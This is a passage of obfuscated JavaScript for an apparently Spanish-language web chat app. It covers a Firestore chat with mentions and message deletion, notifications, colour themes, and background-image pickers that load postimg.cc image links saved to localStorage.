_0xb90262=_0x39f624,_0x1be9b9=_0xe1859b,_0x18e093=document[_0x1be9b9(0x376)](_0x1be9b9(0x282));_0x18e093[_0x1be9b9(0x36a)][_0xb90262(0x2f1)]=_0x1be9b9(0x324),_0x18e093[_0x1be9b9(0x227)]=_0x1be9b9(0x288)+_0x2ef52e+_0x1be9b9(0x1f5)+_0x3151a7+_0x1be9b9(0x2cd)+_0x3f11de+_0x1be9b9(0x1d1)+(_0x24e475?_0x1be9b9(0x1e8)+_0x24e475+_0x1be9b9(0x301):'')+_0x1be9b9(0x1d7),document[_0x1be9b9(0x235)][_0x1be9b9(0x319)](_0x18e093),$id(_0x1be9b9(0x1b5))[_0x1be9b9(0x2d6)]=()=>{const _0x4e2930=_0xb90262;_0x359be6(),_0x18e093[_0x4e2930(0x237)]();};if(_0x24e475)$id(_0x1be9b9(0x1dd))[_0xb90262(0x297)]=()=>_0x18e093[_0x1be9b9(0x2bf)]();}function mostrarNotif(_0x3ebb97){const _0x1a7a89=_0x39f624,_0xf11a54=_0xe1859b,_0x5bda10=document[_0xf11a54(0x376)](_0x1a7a89(0x2bb));_0x5bda10[_0xf11a54(0x229)]=_0x3ebb97,_0x5bda10[_0xf11a54(0x36a)][_0xf11a54(0x24c)]=_0xf11a54(0x2dc),document[_0xf11a54(0x235)][_0xf11a54(0x319)](_0x5bda10),setTimeout(()=>_0x5bda10[_0x1a7a89(0x237)](),0x9c4);}function iniciarChat(){const _0x16aaf0=_0x2ea4a7,_0x9fb364=_0x39f624,_0x177669=_0xe1859b,_0x4d32dc=$id(_0x16aaf0(0x1d4));if(!_0x4d32dc)return;const _0x331de5=auth[_0x177669(0x1c6)];if(!_0x331de5){console[_0x177669(0x338)](_0x177669(0x1d6));return;}const _0x48ece1=_0x331de5[_0x9fb364(0x2ee)],_0x3f1f4f=new Audio(_0x177669(0x246));_0x3f1f4f[_0x177669(0x339)]=0.4;let _0xcf4df1=null,_0x68dd3c=new Set();onSnapshot(doc(db,_0x177669(0x385),_0x48ece1),_0x4f5d6e=>{const _0x1d5a59=_0x9fb364,_0x23f4c1=_0x177669;_0x4f5d6e[_0x23f4c1(0x1be)]()&&_0x4f5d6e[_0x23f4c1(0x291)]()[_0x23f4c1(0x370)]&&(_0xcf4df1=_0x4f5d6e[_0x23f4c1(0x291)]()[_0x1d5a59(0x281)],_0x4d32dc[_0x23f4c1(0x227)]=_0x23f4c1(0x1d8),_0x68dd3c[_0x1d5a59(0x229)]());});const _0x3637ed=query(collection(db,_0x177669(0x2cc)),orderBy(_0x177669(0x34a),_0x177669(0x330)),limit(0xa)),_0x3ea189=onSnapshot(_0x3637ed,_0x1651bd=>{const _0x1bbd61=_0x177669;_0x1651bd[_0x1bbd61(0x237)]()[_0x1bbd61(0x28c)](_0x5bc3cd=>{const _0x2949c7=_0x382f,_0x22eec8=_0xc57b,_0x47fbf4=_0x1bbd61,_0x4622a1=_0x5bc3cd[_0x47fbf4(0x2fa)]['id'],_0x220cf3=_0x5bc3cd[_0x2949c7(0x2b5)][_0x47fbf4(0x291)]();if(_0xcf4df1&&_0x220cf3[_0x47fbf4(0x34a)]&&_0x220cf3[_0x47fbf4(0x34a)][_0x47fbf4(0x337)]()<_0xcf4df1[_0x47fbf4(0x337)]())return;_0x5bc3cd[_0x47fbf4(0x2b5)]===_0x47fbf4(0x29e)&&!_0x68dd3c[_0x47fbf4(0x1c5)](_0x4622a1)&&(_0x68dd3c[_0x22eec8(0x354)]===0x0&&(_0x4d32dc[_0x47fbf4(0x227)]=_0x47fbf4(0x1ed)),_0xcee3bc(_0x4622a1,_0x220cf3,_0x48ece1),_0x68dd3c[_0x22eec8(0x1bb)](_0x4622a1),_0x4d32dc[_0x47fbf4(0x310)]=_0x4d32dc[_0x22eec8(0x1f7)]);if(_0x5bc3cd[_0x47fbf4(0x2b5)]===_0x47fbf4(0x21e)){const _0x92a2e6=_0x4d32dc[_0x47fbf4(0x389)](_0x47fbf4(0x264)+_0x4622a1+'\x22]');_0x92a2e6&&_0x220cf3[_0x47fbf4(0x2fc)]&&(_0x92a2e6[_0x47fbf4(0x227)]=_0x47fbf4(0x250));}if(_0x5bc3cd[_0x22eec8(0x341)]===_0x47fbf4(0x290)){const _0x2770eb=_0x4d32dc[_0x47fbf4(0x389)](_0x47fbf4(0x264)+_0x4622a1+'\x22]');if(_0x2770eb)_0x2770eb[_0x22eec8(0x237)]();}});});function _0xcee3bc(_0x3bede8,_0x3ca2c3,_0x5948a4){const _0x3830c0=_0x16aaf0,_0x2f8d99=_0x9fb364,_0x2b3a31=_0x177669;if(_0x4d32dc[_0x2b3a31(0x389)](_0x3830c0(0x1c5)+_0x3bede8+'\x22]'))return;const _0x231a94=_0x3ca2c3[_0x2b3a31(0x2f5)]||![],_0x38d05b=_0x3ca2c3[_0x2b3a31(0x262)]===_0x5948a4,_0x130d2a=_0x3ca2c3[_0x2b3a31(0x1c1)]||_0x2b3a31(0x30a),_0x3021c3=document[_0x2f8d99(0x2c1)](_0x2b3a31(0x282));_0x3021c3[_0x2f8d99(0x264)][_0x2b3a31(0x1af)]=_0x3bede8,_0x231a94?_0x3021c3[_0x2b3a31(0x36a)][_0x2f8d99(0x2f1)]=_0x2b3a31(0x26e):_0x3021c3[_0x2b3a31(0x36a)][_0x2b3a31(0x24c)]=_0x2b3a31(0x30e);function _0x55541e(_0xc252a5){const _0x5cd197=_0x3830c0,_0xea2f7b=_0x2f8d99,_0x3babe6=_0x2b3a31,_0x3e5dac=document[_0x5cd197(0x2be)](_0xea2f7b(0x2bb));return _0x3e5dac[_0x5cd197(0x1cd)]=_0xc252a5||'',_0x3e5dac[_0x3babe6(0x227)];}let _0x4095e3=_0x55541e(_0x3ca2c3[_0x2b3a31(0x2a7)]);_0x4095e3=_0x4095e3[_0x2b3a31(0x21d)](/\*\*(.*?)\*\*/g,_0x2b3a31(0x217))[_0x2b3a31(0x21d)](/__(.*?)__/g,_0x2b3a31(0x2f4));if(_0x3ca2c3[_0x2b3a31(0x2a7)]&&_0x3ca2c3[_0x2b3a31(0x2a7)][_0x2b3a31(0x215)]('@')){const _0x41d975=(_0x331de5?.[_0x2b3a31(0x2cf)]?.[_0x2b3a31(0x2e7)]('@')[0x0]||'')[_0x2b3a31(0x296)]();_0x4095e3=_0x4095e3[_0x2b3a31(0x21d)](/@([a-zA-Z0-9_]+)/g,(_0x3a0687,_0x54b496)=>{const _0x432500=_0x3830c0,_0x2eef03=_0x2f8d99,_0xa56d27=_0x2b3a31;if(_0x54b496[_0xa56d27(0x296)]()===_0x41d975&&_0x3ca2c3[_0xa56d27(0x262)]!==_0x5948a4)return _0x3f1f4f[_0xa56d27(0x2b9)]()[_0xa56d27(0x2f7)](()=>{}),_0xa56d27(0x2c5)+_0x54b496+_0x2eef03(0x352);return _0x2eef03(0x261)+_0x54b496+_0x432500(0x236);});}const _0x2f663c=_0x55541e(_0x3ca2c3[_0x2b3a31(0x2c9)]||_0x2f8d99(0x246));_0x3021c3[_0x2b3a31(0x227)]=_0x2f8d99(0x353)+_0x130d2a+'\x22>'+_0x2f663c+_0x2b3a31(0x1d0)+_0x4095e3+_0x2b3a31(0x32a);const _0x34d505=document[_0x2b3a31(0x376)](_0x2f8d99(0x2bb));_0x34d505[_0x2b3a31(0x36a)][_0x2f8d99(0x2f1)]=_0x2f8d99(0x203),_0x3021c3[_0x2b3a31(0x388)]=()=>_0x34d505['style'][_0x2b3a31(0x2df)]='1',_0x3021c3[_0x2b3a31(0x1cf)]=()=>_0x34d505[_0x2b3a31(0x36a)][_0x2b3a31(0x2df)]='0';const _0x59fba1=document[_0x2f8d99(0x2c1)](_0x2b3a31(0x27d));_0x59fba1[_0x2b3a31(0x229)]=_0x2b3a31(0x2b8),_0x59fba1[_0x2b3a31(0x36a)][_0x2b3a31(0x24c)]=_0x2b3a31(0x1cb),_0x59fba1[_0x2f8d99(0x297)]=_0x19f0e6=>{const _0x5a06eb=_0x2f8d99;_0x19f0e6[_0x5a06eb(0x359)](),_0x3021c3[_0x5a06eb(0x237)]();},_0x34d505[_0x2b3a31(0x319)](_0x59fba1);if(_0x38d05b){const _0x452698=document[_0x2f8d99(0x2c1)](_0x2b3a31(0x27d));_0x452698[_0x2b3a31(0x229)]=_0x2b3a31(0x236),_0x452698[_0x2b3a31(0x36a)][_0x2b3a31(0x24c)]=_0x2b3a31(0x2f0),_0x452698[_0x3830c0(0x26a)]=_0x3bc2d0=>{const _0x2c120f=_0x2f8d99,_0x536eb0=_0x2b3a31;_0x3bc2d0[_0x536eb0(0x34c)](),mostrarModalPro(_0x2c120f(0x301),_0x536eb0(0x317),_0x536eb0(0x28d),_0x536eb0(0x27b),async()=>{const _0x5628ee=_0x536eb0;await updateDoc(doc(db,_0x5628ee(0x2cc),_0x3bede8),{'texto':_0x5628ee(0x211),'eliminado':!![]}),mostrarNotif(_0x5628ee(0x234));});},_0x34d505[_0x2b3a31(0x319)](_0x452698);}_0x3021c3[_0x2b3a31(0x319)](_0x34d505),_0x4d32dc[_0x2b3a31(0x319)](_0x3021c3);}window[_0x9fb364(0x25b)]=_0x3ea189;const _0x6e5790=async()=>{const _0x1c3c81=_0x16aaf0,_0x41db3d=_0x9fb364,_0x44553d=_0x177669,_0x50bb47=$id(_0x44553d(0x1aa))[_0x44553d(0x33f)][_0x44553d(0x2d2)]();if(!_0x50bb47)return;if(!await checkAntiSpam(_0x50bb47,_0x48ece1))return;const _0x2d4c4d=$id(_0x44553d(0x2d9))[_0x44553d(0x33f)][_0x1c3c81(0x2c0)]()||_0x41db3d(0x246);try{await updateDoc(doc(db,_0x44553d(0x2b0),_0x48ece1),{'usuario':_0x2d4c4d});}catch(_0x48f92a){console[_0x44553d(0x338)](_0x44553d(0x24e),_0x48f92a);}try{await addDoc(collection(db,_0x44553d(0x2cc)),{'texto':_0x50bb47,'usuario':_0x2d4c4d,'uidRemitente':_0x48ece1,'fecha':serverTimestamp(),'colorChat':$id(_0x44553d(0x241))[_0x44553d(0x33f)]||_0x41db3d(0x32f)}),$id(_0x41db3d(0x34c))[_0x44553d(0x33f)]='';}catch(_0x567e9a){console[_0x44553d(0x338)](_0x41db3d(0x2c3),_0x567e9a),mostrarNotif(_0x44553d(0x1c2));}};$id(_0x177669(0x220))[_0x177669(0x2d6)]=_0x6e5790,$id(_0x177669(0x1aa))[_0x9fb364(0x2d5)](_0x177669(0x2e0),_0x27c6c7=>{const _0x12376b=_0x9fb364,_0x1a9c4a=_0x177669;_0x27c6c7[_0x1a9c4a(0x294)]===_0x1a9c4a(0x2be)&&!_0x27c6c7[_0x12376b(0x220)]&&(_0x27c6c7[_0x1a9c4a(0x256)](),_0x6e5790());}),window[_0x9fb364(0x35d)]=async()=>{const _0x21c247=_0x9fb364,_0x3ed0e9=_0x177669;mostrarModalPro(_0x21c247(0x1f3),_0x3ed0e9(0x2da),_0x21c247(0x1cf),_0x21c247(0x323),async()=>{const _0x644fa1=_0x3ed0e9;try{await setDoc(doc(db,_0x644fa1(0x385),_0x48ece1),{'resetTimestamp':serverTimestamp()},{'merge':!![]}),_0x4d32dc[_0x644fa1(0x227)]=_0x644fa1(0x1d8),_0x68dd3c[_0x644fa1(0x1ba)](),mostrarNotif(_0x644fa1(0x2ed));}catch(_0xdce582){console[_0x644fa1(0x338)](_0x644fa1(0x303),_0xdce582);}});};const _0x1721f8=document[_0x177669(0x376)](_0x177669(0x36a));_0x1721f8[_0x16aaf0(0x1cd)]=_0x177669(0x1e3),document[_0x177669(0x384)][_0x177669(0x319)](_0x1721f8);}window[_0x39f624(0x1ac)]=()=>{const _0x36db4e=_0x39f624,_0x261df3=_0xe1859b,_0x4eb932=$id(_0x261df3(0x1fc)),_0xe13165=$id(_0x36db4e(0x382));_0x4eb932[_0x261df3(0x36a)][_0x261df3(0x2a4)]=_0x261df3(0x35d),_0xe13165[_0x36db4e(0x2bf)]='';for(let _0x398750=0x0;_0x398750<0x258;_0x398750++){const _0x51409f=_0x261df3(0x24b)+_0x398750*0.6+_0x261df3(0x1ce),_0x63f060=document[_0x261df3(0x376)](_0x261df3(0x282));_0x63f060[_0x36db4e(0x288)][_0x261df3(0x24c)]=_0x261df3(0x1e9)+_0x51409f+_0x261df3(0x2c6),_0x63f060[_0x261df3(0x2d6)]=()=>{const _0xc3027f=_0x382f,_0x2ea6cd=_0x36db4e,_0x439ebb=_0x261df3;document[_0x439ebb(0x2a5)](_0x439ebb(0x2e2))[_0x439ebb(0x28c)](_0x3a837a=>{const _0x4e9684=_0xc57b,_0x52f03c=_0x439ebb;_0x3a837a[_0x4e9684(0x288)][_0x52f03c(0x320)]=_0x51409f,_0x3a837a[_0x52f03c(0x36a)][_0x52f03c(0x208)]=_0x52f03c(0x226)+_0x51409f;});if(window[_0x439ebb(0x351)])window['binarios'][_0x439ebb(0x35f)]=_0x51409f;_0x4eb932[_0x2ea6cd(0x288)][_0xc3027f(0x2c1)]=_0x2ea6cd(0x25c);},_0xe13165[_0x261df3(0x319)](_0x63f060);}},window[_0xe1859b(0x247)]=()=>{const _0x3809d5=_0x2ea4a7,_0x2347db=_0x39f624,_0x4e712e=_0xe1859b;document[_0x4e712e(0x2a5)](_0x2347db(0x1ca))[_0x4e712e(0x28c)](_0x49a0a1=>{const _0x206bad=_0x2347db,_0x3af075=_0x4e712e;_0x49a0a1[_0x3af075(0x36a)][_0x206bad(0x25d)]=_0x3af075(0x30a),_0x49a0a1[_0x206bad(0x288)][_0x3af075(0x208)]=_0x3af075(0x29c);});if(window[_0x4e712e(0x351)])window[_0x4e712e(0x351)][_0x3809d5(0x21f)]=_0x2347db(0x32f);$id(_0x4e712e(0x1fc))[_0x4e712e(0x36a)][_0x4e712e(0x2a4)]=_0x4e712e(0x277);},window[_0x2ea4a7(0x180)]=()=>$id(_0x2ea4a7(0x234))[_0xe1859b(0x36a)][_0xe1859b(0x2a4)]=_0x39f624(0x25c);const imagenesEnlaces=[_0xe1859b(0x28f),_0xe1859b(0x375),_0xe1859b(0x233),_0xe1859b(0x31a),_0xe1859b(0x27a),_0xe1859b(0x289),_0xe1859b(0x1d9),_0xe1859b(0x21c),_0x39f624(0x1e9),_0xe1859b(0x1f2),_0x39f624(0x331),_0x39f624(0x22b),_0xe1859b(0x257),_0xe1859b(0x1b6),_0xe1859b(0x354),_0xe1859b(0x2aa),_0xe1859b(0x2e4),_0xe1859b(0x343),_0xe1859b(0x1cc),_0x39f624(0x2b8),_0xe1859b(0x213),_0xe1859b(0x2ce),_0xe1859b(0x305),_0xe1859b(0x21f),_0xe1859b(0x309),_0xe1859b(0x2ef),_0xe1859b(0x332),_0xe1859b(0x210),_0xe1859b(0x2ca),_0xe1859b(0x2bd),_0x39f624(0x279),_0xe1859b(0x334),_0x39f624(0x1b1),_0xe1859b(0x346),_0x39f624(0x37d),_0xe1859b(0x283)],imagenesInicio=[_0xe1859b(0x30b),_0xe1859b(0x355),'https://i.postimg.cc/52TJqV9M/images-(56).jpg',_0x39f624(0x250),_0x39f624(0x22d),_0xe1859b(0x365),_0x39f624(0x33f),_0x39f624(0x20c),_0xe1859b(0x292),_0xe1859b(0x2b2),_0xe1859b(0x329),_0xe1859b(0x265),_0xe1859b(0x2d7),_0x39f624(0x1c0),_0xe1859b(0x35b),_0xe1859b(0x260),_0xe1859b(0x2b6),_0xe1859b(0x1ac),_0xe1859b(0x2e8),_0xe1859b(0x383),_0xe1859b(0x22d),_0xe1859b(0x1f0),_0xe1859b(0x2d1),_0xe1859b(0x316),_0xe1859b(0x325),_0xe1859b(0x362),_0xe1859b(0x1ec),_0x39f624(0x276),_0xe1859b(0x1fe),_0x39f624(0x2a5),_0xe1859b(0x2ff),_0x39f624(0x2fc),_0xe1859b(0x22a),_0xe1859b(0x2d0),_0xe1859b(0x342),_0xe1859b(0x295),_0xe1859b(0x2a2),_0xe1859b(0x2bc),'https://i.postimg.cc/x1stx8Tn/03cc17bcbadd24576e56973a97466661.jpg',_0x39f624(0x29e),_0xe1859b(0x25a),_0xe1859b(0x252),_0xe1859b(0x26b),_0xe1859b(0x2b7),_0xe1859b(0x36f),_0xe1859b(0x261),_0x39f624(0x206),_0xe1859b(0x251),_0xe1859b(0x2b4),_0xe1859b(0x2d8),_0xe1859b(0x1cd),_0xe1859b(0x387),_0xe1859b(0x232),_0xe1859b(0x32e),_0xe1859b(0x327),_0xe1859b(0x379),_0xe1859b(0x27c),_0x2ea4a7(0x312),_0xe1859b(0x216),_0xe1859b(0x1bc),_0xe1859b(0x2a1),_0xe1859b(0x2c1),_0xe1859b(0x2ad),_0xe1859b(0x1e6),_0xe1859b(0x36e),_0xe1859b(0x1b4),_0xe1859b(0x2bb),_0x39f624(0x200),_0x39f624(0x2f6),_0xe1859b(0x2f9),_0x39f624(0x309),_0xe1859b(0x33a),_0xe1859b(0x378),_0x2ea4a7(0x1d7),_0x39f624(0x2f2),_0xe1859b(0x249),_0xe1859b(0x1f4),_0xe1859b(0x25f),_0x39f624(0x2af),_0xe1859b(0x2cb),_0x39f624(0x1ee),_0xe1859b(0x361),_0xe1859b(0x218),_0xe1859b(0x373),_0xe1859b(0x34d),_0xe1859b(0x24d),_0xe1859b(0x344)];window[_0xe1859b(0x230)]=()=>{const _0x23c6e7=_0x39f624,_0x28ab5e=_0xe1859b,_0x3ee946=$id(_0x28ab5e(0x36b)),_0x3286d1=$id(_0x23c6e7(0x37e));_0x3ee946[_0x28ab5e(0x36a)][_0x23c6e7(0x1fb)]=_0x3ee946[_0x28ab5e(0x36a)][_0x28ab5e(0x2a4)]===_0x23c6e7(0x292)?_0x28ab5e(0x277):_0x28ab5e(0x381),_0x3ee946[_0x28ab5e(0x36a)][_0x28ab5e(0x2a4)]===_0x28ab5e(0x381)&&_0x3286d1[_0x28ab5e(0x227)]===''&&imagenesEnlaces[_0x28ab5e(0x28c)](_0x437c8b=>{const _0x33f375=_0x23c6e7,_0x1518e1=_0x28ab5e,_0x5ca537=document[_0x1518e1(0x376)](_0x1518e1(0x223));_0x5ca537[_0x33f375(0x2d4)]=_0x437c8b,_0x5ca537[_0x1518e1(0x36a)][_0x1518e1(0x24c)]=_0x1518e1(0x31e),_0x5ca537[_0x33f375(0x297)]=()=>{const _0x1679d1=_0x382f,_0x174d95=_0x33f375,_0xcf6d5f=_0x1518e1;$id(_0xcf6d5f(0x20b))[_0xcf6d5f(0x36a)][_0xcf6d5f(0x2f8)]=_0x1679d1(0x23c)+_0x437c8b+')',$id(_0xcf6d5f(0x20b))[_0x1679d1(0x317)][_0x174d95(0x249)]=_0xcf6d5f(0x2fe),localStorage['setItem'](_0xcf6d5f(0x308),_0x437c8b),_0x3ee946[_0xcf6d5f(0x36a)][_0xcf6d5f(0x2a4)]=_0xcf6d5f(0x277);},_0x3286d1[_0x33f375(0x316)](_0x5ca537);});},window[_0xe1859b(0x1db)]=()=>{const _0x5033f4=_0x2ea4a7,_0x7a5e56=_0x39f624,_0x2f12eb=_0xe1859b,_0x3311e6=$id(_0x2f12eb(0x313)),_0x2cdd2=$id(_0x7a5e56(0x35a));_0x3311e6[_0x2f12eb(0x36a)][_0x2f12eb(0x2a4)]=_0x3311e6[_0x2f12eb(0x36a)][_0x2f12eb(0x2a4)]===_0x2f12eb(0x381)?_0x2f12eb(0x277):_0x2f12eb(0x381),_0x3311e6[_0x2f12eb(0x36a)][_0x2f12eb(0x2a4)]===_0x2f12eb(0x381)&&_0x2cdd2[_0x2f12eb(0x227)]===''&&imagenesInicio[_0x5033f4(0x2f9)](_0x4ec690=>{const _0x2c0635=_0x7a5e56,_0x349f91=_0x2f12eb,_0x3964d1=document['createElement'](_0x349f91(0x223));_0x3964d1[_0x349f91(0x380)]=_0x4ec690,_0x3964d1[_0x349f91(0x36a)][_0x349f91(0x24c)]=_0x2c0635(0x333),_0x3964d1[_0x349f91(0x2d6)]=()=>{const _0x4d2efd=_0x2c0635,_0x3f3e18=_0x349f91;document[_0x3f3e18(0x235)][_0x3f3e18(0x36a)][_0x4d2efd(0x263)]=_0x3f3e18(0x318)+_0x4ec690+_0x4d2efd(0x21a),localStorage[_0x3f3e18(0x279)](_0x3f3e18(0x2fb),_0x4ec690),_0x3311e6[_0x3f3e18(0x36a)][_0x3f3e18(0x2a4)]=_0x3f3e18(0x277);},_0x2cdd2[_0x349f91(0x319)](_0x3964d1);});};function cargarFondosGuardados(){const _0x20a16e=_0x39f624,_0x5b93a6=_0xe1859b,_0x8868cf=localStorage[_0x5b93a6(0x32c)](_0x5b93a6(0x308)),_0x4f6544=localStorage[_0x5b93a6(0x32c)](_0x5b93a6(0x2fb));if(_0x8868cf)$id(_0x5b93a6(0x20b))[_0x5b93a6(0x36a)][_0x5b93a6(0x2f8)]=_0x5b93a6(0x1e0)+_0x8868cf+')';if(_0x4f6544)document[_0x5b93a6(0x235)][_0x5b93a6(0x36a)][_0x5b93a6(0x356)]=_0x20a16e(0x2a1)+_0x4f6544+_0x5b93a6(0x366);}window[_0xe1859b(0x38b)](_0xe1859b(0x1dc),cargarFondosGuardados);function _0xc57b(_0x25f55e,_0x172409){_0x25f55e=_0x25f55e-0x1a5;const _0x5d6712=_0x10d7();let _0x4a520b=_0x5d6712[_0x25f55e];return _0x4a520b;}const imagenesMenuLateral=[_0x39f624(0x2de),_0xe1859b(0x355),_0xe1859b(0x30c),_0x39f624(0x250),_0x39f624(0x22d),_0x39f624(0x24c),_0x39f624(0x33f),_0xe1859b(0x225),_0xe1859b(0x292),_0x39f624(0x2a4),_0xe1859b(0x329),_0xe1859b(0x265),_0xe1859b(0x2d7),_0xe1859b(0x1d4),_0x39f624(0x25e),_0xe1859b(0x260),_0xe1859b(0x2b6),_0xe1859b(0x1ac),_0x2ea4a7(0x1fc),_0xe1859b(0x383),_0xe1859b(0x22d),_0xe1859b(0x1f0),_0x2ea4a7(0x277),_0xe1859b(0x316),_0x39f624(0x22a),_0xe1859b(0x362),_0x2ea4a7(0x2db),_0xe1859b(0x202),_0xe1859b(0x1fe),_0xe1859b(0x273),_0xe1859b(0x2ff),_0x39f624(0x2fc),_0xe1859b(0x22a),_0xe1859b(0x2d0),_0xe1859b(0x342),_0xe1859b(0x295),_0xe1859b(0x2a2),_0xe1859b(0x2bc),_0xe1859b(0x259),_0x39f624(0x29e),_0xe1859b(0x25a),_0xe1859b(0x252),_0xe1859b(0x26b),_0xe1859b(0x2b7),_0xe1859b(0x36f),_0xe1859b(0x261),_0x2ea4a7(0x2fe),_0xe1859b(0x251),_0xe1859b(0x2b4),_0xe1859b(0x2d8),_0xe1859b(0x1cd),_0xe1859b(0x387),_0xe1859b(0x232),_0xe1859b(0x32e),_0x39f624(0x376),_0xe1859b(0x379),_0xe1859b(0x27c),_0xe1859b(0x314),_0xe1859b(0x216),_0xe1859b(0x1bc),_0xe1859b(0x2a1),_0xe1859b(0x2c1),_0x39f624(0x272),_0xe1859b(0x1e6),_0xe1859b(0x36e),_0xe1859b(0x1b4),_0xe1859b(0x2bb),_0xe1859b(0x248),_0xe1859b(0x1c9),_0xe1859b(0x2f9),_0xe1859b(0x31d),_0xe1859b(0x33a),'https://i.postimg.cc/Y9vVfg1X/hacker-g1e3a44200-1920-b6ba00f811758a41c98bff2db4b9e3e4-2000.jpg',_0xe1859b(0x1e5),_0xe1859b(0x348),_0xe1859b(0x249),_0x2ea4a7(0x2a2),_0x39f624(0x32c),_0xe1859b(0x1d5),_0xe1859b(0x2cb),_0xe1859b(0x326),_0xe1859b(0x361),_0xe1859b(0x218),_0xe1859b(0x373),_0x39f624(0x2ba),_0xe1859b(0x24d),_0xe1859b(0x344)];window[_0x2ea4a7(0x2ac)]=()=>{const _0x499587=_0x39f624,_0x11a3e9=_0xe1859b,_0x16167c=$id(_0x11a3e9(0x1df)),_0x4e6079=$id(_0x11a3e9(0x270));_0x16167c[_0x11a3e9(0x36a)][_0x11a3e9(0x2a4)]=_0x16167c[_0x499587(0x288)][_0x11a3e9(0x2a4)]===_0x11a3e9(0x381)?_0x499587(0x25c):_0x11a3e9(0x381),_0x16167c[_0x11a3e9(0x36a)][_0x11a3e9(0x2a4)]===_0x11a3e9(0x381)&&_0x4e6079[_0x11a3e9(0x227)]===''&&imagenesMenuLateral[_0x11a3e9(0x28c)](_0x1247a2=>{const _0x495846=_0x382f,_0x183c30=_0x499587,_0x4bcca6=_0x11a3e9,_0x1d17d1=document[_0x4bcca6(0x376)](_0x4bcca6(0x223));_0x1d17d1[_0x4bcca6(0x380)]=_0x1247a2,_0x1d17d1[_0x4bcca6(0x37c)]=_0x183c30(0x30c),_0x1d17d1[_0x4bcca6(0x36a)][_0x4bcca6(0x24c)]=_0x4bcca6(0x31e),_0x1d17d1[_0x183c30(0x297)]=()=>{const _0x7298d7=_0x382f,_0x305a16=_0x183c30,_0x1118d3=_0x4bcca6,_0x2ec01e=$id(_0x305a16(0x21c));if(_0x2ec01e){const _0x1cfc20=_0x1247a2[_0x305a16(0x26a)](/\(/g,_0x1118d3(0x23a))[_0x1118d3(0x21d)](/\)/g,_0x1118d3(0x367));_0x2ec01e['style'][_0x7298d7(0x33b)]=_0x1118d3(0x1e0)+_0x1cfc20+')',_0x2ec01e[_0x1118d3(0x36a)][_0x1118d3(0x372)]=_0x1118d3(0x2fe),_0x2ec01e[_0x305a16(0x288)][_0x1118d3(0x1f8)]=_0x1118d3(0x368),_0x2ec01e[_0x305a16(0x288)][_0x305a16(0x2b5)]=_0x1118d3(0x284);}localStorage[_0x1118d3(0x279)](_0x1118d3(0x254),_0x1247a2),_0x16167c[_0x1118d3(0x36a)][_0x1118d3(0x2a4)]=_0x1118d3(0x277),mostrarNotif('Fondo\x20del\x20menú\x20lateral\x20cambiado');},_0x4e6079[_0x495846(0x261)](_0x1d17d1);});};function cargarFondoMenuLateralGuardado(){const _0x57952f=_0x39f624,_0x2be786=_0xe1859b,_0x136c35=localStorage[_0x57952f(0x202)](_0x2be786(0x254));if(_0x136c35){const _0x59f522=$id(_0x2be786(0x20d));_0x59f522&&(_0x59f522[_0x2be786(0x36a)][_0x2be786(0x2f8)]=_0x2be786(0x1e0)+_0x136c35+')',_0x59f522[_0x57952f(0x288)][_0x2be786(0x372)]=_0x2be786(0x2fe),_0x59f522[_0x2be786(0x36a)][_0x2be786(0x1f8)]=_0x2be786(0x368),_0x59f522[_0x2be786(0x36a)][_0x2be786(0x34f)]=_0x2be786(0x284));}}window[_0xe1859b(0x38b)](_0xe1859b(0x1dc),cargarFondoMenuLateralGuardado),document[_0x39f624(0x1f8)](_0xe1859b(0x1a8))[_0xe1859b(0x2d6)]=function(_0x361603){const _0x5c6bab=_0x2ea4a7,_0x2d0e85=_0x39f624,_0x39d92e=_0xe1859b;_0x361603[_0x2d0e85(0x359)]();const _0x5778b8=$id(_0x2d0e85(0x2d9));_0x5778b8[_0x39d92e(0x36a)][_0x39d92e(0x2a4)]=_0x5778b8[_0x5c6bab(0x317)][_0x39d92e(0x2a4)]===_0x39d92e(0x381)?_0x39d92e(0x277):_0x39d92e(0x381);},document[_0xe1859b(0x2a5)](_0xe1859b(0x1e1))[_0xe1859b(0x28c)](_0x1f2210=>{const _0x72adeb=_0xe1859b;_0x1f2210[_0x72adeb(0x2d6)]=function(){const _0x713772=_0x382f,_0x3bbd1b=_0x72adeb,_0x1e97f0=this[_0x3bbd1b(0x1fa)]['t'];document[_0x3bbd1b(0x2a5)](_0x3bbd1b(0x1bd))[_0x3bbd1b(0x28c)](_0x56cefc=>{const _0x20cb10=_0xc57b,_0xca27b=_0x3bbd1b;_0x56cefc[_0x20cb10(0x282)][_0xca27b(0x2bf)](_0xca27b(0x244),_0xca27b(0x1bb),_0xca27b(0x21a),_0x20cb10(0x2d1),_0x20cb10(0x28d),_0x20cb10(0x299),_0xca27b(0x2d5),_0xca27b(0x33b),_0x20cb10(0x265),_0xca27b(0x20e),_0xca27b(0x2fd),_0xca27b(0x22b),_0xca27b(0x335),_0x20cb10(0x256),_0xca27b(0x37e),_0x20cb10(0x227),_0xca27b(0x302),_0xca27b(0x1eb),_0xca27b(0x23c),'tema-darkscan',_0xca27b(0x1c7),_0xca27b(0x340)),_0x56cefc[_0xca27b(0x24f)][_0xca27b(0x2b1)](_0xca27b(0x1f6)+_0x1e97f0);}),localStorage[_0x3bbd1b(0x279)](_0x3bbd1b(0x32b),_0x1e97f0),$id('listaTema2')[_0x3bbd1b(0x36a)][_0x3bbd1b(0x2a4)]=_0x713772(0x310);};});const savedTema=localStorage[_0xe1859b(0x32c)](_0xe1859b(0x32b))||_0x39f624(0x25c);document[_0x39f624(0x1d1)](_0xe1859b(0x1bd))[_0xe1859b(0x28c)](_0x3de2ad=>{const _0x270b17=_0xe1859b;_0x3de2ad[_0x270b17(0x24f)][_0x270b17(0x2b1)](_0x270b17(0x1f6)+savedTema);}),(function(){setTimeout(()=>{const _0x278cf8=_0xc57b,_0x49b812=_0x56f7,_0x35fd81=$id(_0x49b812(0x1aa)),_0x45647c=document[_0x49b812(0x389)](_0x49b812(0x1de));if(!_0x35fd81||!_0x45647c)return;_0x45647c[_0x49b812(0x36a)][_0x49b812(0x1ca)]=_0x49b812(0x35e);const _0x99f300=document[_0x49b812(0x376)](_0x49b812(0x282));_0x99f300[_0x49b812(0x36a)][_0x49b812(0x24c)]=_0x49b812(0x2a0),_0x45647c[_0x49b812(0x319)](_0x99f300);let _0x3cd614=new Set();function _0x231311(){const _0x35747a=_0x382f,_0x15c3ad=_0x49b812;_0x3cd614[_0x35747a(0x2d5)](),document[_0x35747a(0x22f)](_0x15c3ad(0x1d3))[_0x15c3ad(0x28c)](_0x166853=>{const 